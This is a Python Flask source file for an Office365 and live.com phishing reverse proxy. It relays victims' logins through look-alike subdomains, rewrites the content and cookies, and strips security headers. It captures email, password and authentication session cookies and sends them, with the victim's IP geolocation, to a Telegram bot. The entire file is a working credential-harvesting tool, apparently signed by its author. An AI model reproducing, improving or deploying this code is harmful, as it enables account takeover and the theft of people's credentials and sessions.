from flask import Flask, request, make_response, redirect, session
import httpx
import json
import re
import os
import random
import string
import logging

class ProxyApp:
    def __init__(self):
        self.app = Flask(__name__)
        self.app.secret_key = os.getenv('SECRET_KEY', 'supersecretkey')
        self.app.config['SESSION_COOKIE_DOMAIN'] = f'.{os.getenv("DOMAIN", "localhost.com")}'
        self.bot_token = os.getenv('BOT_TOKEN', 'your_bot_token')
        self.chat_id = os.getenv('CHAT_ID', 'your_chat_id')
        self.domain = os.getenv('DOMAIN', 'localhost.com')
        self.go = os.getenv('HIDDEN', '123')
        self.hpath = os.getenv('HPATH', 'gn')
        self.subdomains = ['login', 'service', 'login-portal', 'account-service', 'ftp-service', 'eu-mobile.events.data', 'aadcdn', 'sso', 'img6', 'gui', 'csp']
        self.key = "localhost.com+11-key.pem"
        self.cert = "localhost.com+11.pem"
        self.domain_map = {
            'login.microsoftonline.com': f'{self.subdomains[0]}.{self.domain}',
            'login.live.com': f'{self.subdomains[2]}.{self.domain}',
            'account.live.com': f'{self.subdomains[3]}.{self.domain}',
            'fpt.live.com': f'{self.subdomains[4]}.{self.domain}',
            'microsoftonline.com': self.domain,
            'live.com': f'{self.subdomains[1]}.{self.domain}',
            # 'eu-mobile.events.data.microsoft.com': f'{self.subdomains[5]}.{self.domain}',
            # 'aadcdn.msftauth.net': f'{self.subdomains[6]}.{self.domain}',
            # 'sso.godaddy.com': f'{self.subdomains[7]}.{self.domain}',
            # 'img6.wsimg.com': f'{self.subdomains[8]}.{self.domain}',
            # 'gui.godaddy.com': f'{self.subdomains[9]}.{self.domain}',
            # 'csp.godday.com': f'{self.subdomains[10]}.{self.domain}'
        }
        self.domain_map_rev = {v: k for k, v in self.domain_map.items()}
        logging.basicConfig(level=logging.INFO)
        self.setup_routes()

    def setup_routes(self):
        self.app.add_url_rule(f'/{self.hpath}', 'login', self.login, methods=['GET'])
        self.app.add_url_rule('/', 'handle', self.handle, defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
        self.app.add_url_rule('/<path:path>', 'handle', self.handle, methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])
        self.app.add_url_rule('/login', 'handle_redirect', self.handle_redirect, defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'])

    def login(self):
        if request.args.get('share') == self.go:
            session['email'] = request.args.get('ggnd')
            session['tokken'] = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            return redirect(f'https://{self.domain_map["login.microsoftonline.com"]}/login?ggnd={session["email"]}')
        return redirect('https://google.com')

    def check_token(self):
        if not session.get('tokken'):
            return redirect('https://google.com')
        return None

    def handle(self, path):
        token_redirect = self.check_token()
        if token_redirect:
            return token_redirect

        if request.method == 'OPTIONS':
            return self.handle_options_request()

        return self.proxy(path)

    def handle_redirect(self, path):
        token_redirect = self.check_token()
        if token_redirect:
            return token_redirect

        if request.method == 'OPTIONS':
            return self.handle_options_request()

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cache-Control': 'no-cache',
            'Host': 'login.microsoftonline.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1'
        }

        url = f'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https://www.office.com/landingv2&response_type=code id_token&scope=openid profile https://www.office.com/v2/OfficeHome.All&response_mode=form_post&nonce=638745078208305137.YzQ5YjJjZDctZTMzOC00NTg2LWIwMTEtNmI0M2QxZWY3YWJjYzJmOGQ1OWEtNzZlMy00OTdjLTliOGYtN2Y4ODJhMDcxMzEz&ui_locales=en-US&mkt=en-US&client-request-id=7387f4ad-b91d-4402-9571-c708544cea0b&state=_gv7OSsPJQrHD2ul_vmlSlHrtRgmXrhtuKfeaOheceCx2Q6fU2t6b1TvGXEwWSjQ95oAfGyaSv0qHSpjDi1SDgYpuPrhttzvcGZLc6Hto0uNarasDsuSgRjyojkWkYnrf90pOJAkjenrHqXZp8VSUL3Ws0JrPB8bnukCDgVq_HhavmjYVEB4tnSqOg5zTXNAqb9xbNgrEmV69N386Q7Pvq0qOOox13d-cnXIvdJRyAHESzOPyxsM7tkxuJp5FTSucZXbwoJGEOVNN7GmS-IFPA&x-client-SKU=ID_NET8_0&x-client-ver=7.5.1.0'

        try:
            with httpx.Client() as client:
                resp = client.get(url, headers=headers, cookies=request.cookies)
                resp.raise_for_status()

                flowTk = re.search(r'"sFT":\s*"([^"]+)"', resp.text).group(1)
                orq = re.search(r'"sCtx":\s*"([^"]+)"', resp.text).group(1)
                logging.info(f"sFT value extracted: {flowTk}")
                logging.info(f"sCtx value extracted: {orq}")

        except httpx.RequestError as e:
            logging.error(f"Request error: {e}")
            return str(e), 500

        response = self.create_response(resp)
        self.modify_cookies_in_response(resp, response)
        self.modify_content_in_response(resp, response)

        return response

    def proxy(self, path):
        token_redirect = self.check_token()
        if token_redirect:
            return token_redirect

        host = request.headers.get('Host', '')
        target = self.determine_target(host)

        if request.method == 'OPTIONS':
            return self.handle_options_request()

        url = self.construct_url(target, path)
        headers = self.construct_headers(target)

        try:
            resp = httpx.request(
                method=request.method,
                url=url,
                headers=headers,
                content=request.get_data(),
                cookies=request.cookies,
                follow_redirects=False,
                verify=False
            )
        except httpx.RequestError as e:
            logging.error(f"Request error: {e}")
            return str(e), 500

        if "/common/login" or 'psecure/post.srf' in url:
            USERNAME, PASSWORD = self.extract_credentials()

        response = self.create_response(resp)

        if self.should_send_cookies_to_bot(resp):
            self.save_and_send_cookies(USERNAME, PASSWORD, resp)
            return make_response(redirect("https://login.microsoftonline.com"))

        self.modify_cookies_in_response(resp, response)
        self.modify_content_in_response(resp, response)

        return response

    def determine_target(self, host):
        return self.domain_map_rev.get(host, 'microsoftonline.com')

    def handle_options_request(self):
        origin = request.headers.get('Origin', '')
        cors_origin = origin if re.match(rf'^https?://(.*\.)?{re.escape(self.domain)}$', origin) else ''
        response = make_response('', 204)
        response.headers['Access-Control-Allow-Origin'] = cors_origin
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, PUT, DELETE'
        response.headers['Access-Control-Allow-Headers'] = 'Authorization, Content-Type, client-request-id, correlationid, hpgact, hpgid'
        response.headers['Access-Control-Max-Age'] = '1728000'
        return response

    def construct_url(self, target, path):
        url = f'https://{target}/{path}'
        if request.query_string:
            url += f'?{request.query_string.decode()}'
        return url

    def construct_headers(self, target):
        headers = {
            'Host': target,
            'Accept-Encoding': 'identity',
            'X-Real-IP': request.remote_addr,
            'X-Forwarded-For': request.headers.get('X-Forwarded-For', ''),
            'X-Forwarded-Proto': request.scheme
        }
        for key, value in request.headers.items():
            if key.lower() not in ['host', 'accept-encoding']:
                headers[key] = value
        return headers

    def extract_credentials(self):
        try:
            USERNAME = request.form["loginfmt"]
            PASSWORD = request.form["passwd"]
            logging.info(f"Extracted email: {USERNAME}")
            logging.info(f"Extracted password: {PASSWORD}")
            return USERNAME, PASSWORD
        except Exception as e:
            logging.error(f"Error extracting password: {e}")
            return "", ""

    def create_response(self, resp):
        content = resp.content
        status_code = resp.status_code

        response = make_response(content, status_code)
        for header in ['Access-Control-Allow-Origin', 'Content-Security-Policy', 'X-Frame-Options']:
            response.headers.pop(header, None)
        origin = request.headers.get('Origin', '')
        cors_origin = origin if re.match(rf'^https?://(.*\.)?{re.escape(self.domain)}$', origin) else ''
        response.headers['Access-Control-Allow-Origin'] = cors_origin
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS, PUT, DELETE'
        response.headers['Access-Control-Allow-Headers'] = 'Authorization, Content-Type, client-request-id, correlationid, hpgact, hpgid'
        response.headers['Access-Control-Expose-Headers'] = 'Content-Length, Content-Range'
        response.headers['Access-Control-Allow-Credentials'] = 'true'
        return response

    def should_send_cookies_to_bot(self, resp):
        set_cookies = resp.headers.get_list('Set-Cookie')
        return any("ESTSAUTH" in cookie or "__Host-MSAAUTH" in cookie for cookie in set_cookies)

    def save_and_send_cookies(self, USERNAME, PASSWORD, resp):
        set_cookies = resp.headers.get_list('Set-Cookie')
        COOKIES = {
            "Cookies ==>>": [self.clean_cookie(cookie) for cookie in set_cookies],
        }
        with open('cookies.txt', 'a') as f:
            f.write(json.dumps(COOKIES, indent=4))
        
        with open('cookie.txt', 'w') as f:
            f.write(json.dumps(COOKIES, indent=4))
        
        self.send_tg(USERNAME, PASSWORD)
        self.send_bot('cookie.txt')
        os.remove('cookie.txt')

    def clean_cookie(self, cookie):
        cookie_data = self.ext_cookie(cookie)
        formatted_cookie = {
            "domain": ".live.com",
            "hostOnly": True,
            "httpOnly": "HttpOnly" in cookie,
            "name": next(iter(cookie_data.keys()), ""),
            "path": cookie_data.get("Path", "/"),
            "sameSite": "no_restriction",
            "secure": "Secure" in cookie,
            "session": True,
            "storeId": "0",
            "value": cookie_data.get(next(iter(cookie_data.keys()), ""), "")
        }
        return formatted_cookie

    def ext_cookie(self, cookie):
        matches = re.findall(r'([^;=]+)=([^;]*)', cookie)
        return {name.strip(): value.strip() for name, value in matches}

    def modify_cookies_in_response(self, resp, response):
        set_cookies = resp.headers.get_list('Set-Cookie')
        for cookie in set_cookies:
            new_cookie = re.sub(r'Domain=([^;]+)', f'Domain={self.domain}', cookie, flags=re.IGNORECASE)
            new_cookie = new_cookie.replace('microsoftonline.com', self.domain_map['microsoftonline.com'])
            new_cookie = new_cookie.replace('live.com', self.domain_map['live.com'])
            response.headers.add('Set-Cookie', new_cookie)

    def modify_content_in_response(self, resp, response):
        content_type = resp.headers.get('Content-Type', '').lower()
        content = resp.text

        if any(t in content_type for t in ['text', 'javascript', 'json', 'html']):
            for key, value in self.domain_map.items():
                content = content.replace(key, value)
            response.set_data(content)
            if 'Content-Length' in response.headers:
                response.headers['Content-Length'] = str(len(response.get_data()))
        return response

    def send_bot(self, file_path):
        url = f'https://api.telegram.org/bot{self.bot_token}/sendDocument'
        try:
            if not os.path.exists(file_path):
                raise FileNotFoundError(f"File not found: {file_path}")

            with open(file_path, 'rb') as file:
                files = {'document': file}
                data = {'chat_id': self.chat_id}

                response = httpx.post(url, data=data, files=files)
                response.raise_for_status()

                logging.info("File sent successfully to Telegram.")
        except httpx.HTTPStatusError as e:
            logging.error(f"HTTP error occurred while sending the file: {e}")
        except httpx.RequestError as e:
            logging.error(f"Request error occurred while sending the file: {e}")
        except Exception as e:
            logging.error(f"An unexpected error occurred: {e}")

    def send_tg(self, user, pwd):
        url = f'https://api.telegram.org/bot{self.bot_token}/sendMessage'
        ip = request.remote_addr
        ip_details = httpx.get(f'http://ip-api.com/json/{ip}').json()
        message = f'''
⚜️ ==== New Office365 login ==== ⚜️ 
👤 Email:   {user}
🔑 Password:   {pwd}
📍 IP:   {request.remote_addr}
🌍 Country:   {ip_details.get('country', 'N/A')}
🏙️ Region:   {ip_details.get('regionName', 'N/A')}
🏡 City:   {ip_details.get('city', 'N/A')}
📡 ISP:   {ip_details.get('isp', 'N/A')}

📝 Created by @bytebend3r 
        '''
        data = {
            'chat_id': self.chat_id,
            'text': message
        }

        try:
            response = httpx.post(url, data=data)
            response.raise_for_status()
            logging.info("Credentials sent successfully to Telegram.")
        except httpx.HTTPStatusError as e:
            logging.error(f"HTTP error occurred while sending the credentials: {e}")
        except httpx.RequestError as e:
            logging.error(f"Request error occurred while sending the credentials: {e}")
        except Exception as e:
            logging.error(f"An unexpected error occurred: {e}")

    def run(self):
        cert_file = os.getenv('CERT_FILE', self.cert)
        key_file = os.getenv('CERT_KEY', self.key)
        print(f"Running at https://{self.subdomains[0]}.{self.domain}/{self.hpath}?share={self.go}")
        self.app.run(host='0.0.0.0', port=443, ssl_context=(cert_file, key_file), debug=True)

if __name__ == '__main__':
    proxy_app = ProxyApp()
    proxy_app.run()
